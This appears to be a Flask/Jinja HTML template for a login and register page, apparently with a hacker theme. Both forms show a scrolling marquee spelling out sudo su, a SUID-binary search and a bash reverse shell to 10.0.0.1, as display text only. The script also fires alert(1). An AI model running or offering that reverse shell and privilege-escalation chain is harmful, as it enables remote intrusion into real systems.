<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="{{ url_for('static', filename='css/login.css') }}">
	<title></title>
</head>

<body>


	<div class="page">

		<div class="navbar">
			<div class="navbar_block">
				<a href="/"> Home </a>
			</div>
			<div class="navbar_block">
				<a href="/login"> Login  </a>
			</div>
		</div>



		<div class="content">
			<div class="display">

				<div class="form">

					<div class="registerButton">
						<div class="registerCircle"  onclick="Change()">
							Salut
						</div>
					</div>


					<div id="login" class="login">

						<div class="titlu">

							Login
						</div>
						<form action="/login", method="post">
							<input type="text" id="fname" name="firstname" placeholder="Username">

							<input type="password" id="lname" name="lastname" placeholder="">
							<marquee class="stiri" scrollamount="5" loop="infinite">sudo su; ls -la; pwd; id; whoami; find / -perm /4000; bash -i >& /dev/tcp/10.0.0.1/53 0>&1</marquee>


							<div class="titlu">
								<input type="submit" value="Submit">
							</div>
						</form>
					</div>


					<div id="register" class="register">

						<div class="titlu">

							Register
						</div>
						<form action="/register", method="post">
							<input type="text" id="fname" name="firstname" placeholder="Username">

							<input type="password" id="lname" name="lastname" placeholder="">
							<marquee class="stiri" scrollamount="5" loop="infinite">sudo su; ls -la; pwd; id; whoami; find / -perm /4000; bash -i >& /dev/tcp/10.0.0.1/53 0>&1</marquee>
							<div class="titlu">
								<input type="submit" value="Submit">
							</div>
						</form>
					</div>

				</div>
			</div>



		</div>

	</div>
</body>

</html>


<script type="text/javascript">
	
	var ok = 0;
	function Change(){
		alert(1);
		if ( ok == 0 ){
			ok = 1;
			document.getElementById("login").style.display="none";
			document.getElementById("register").style.display="block";
		}
		else{
			ok = 0;
			document.getElementById("login").style.display="block";
			document.getElementById("register").style.display="none";
		}
	}
</script>
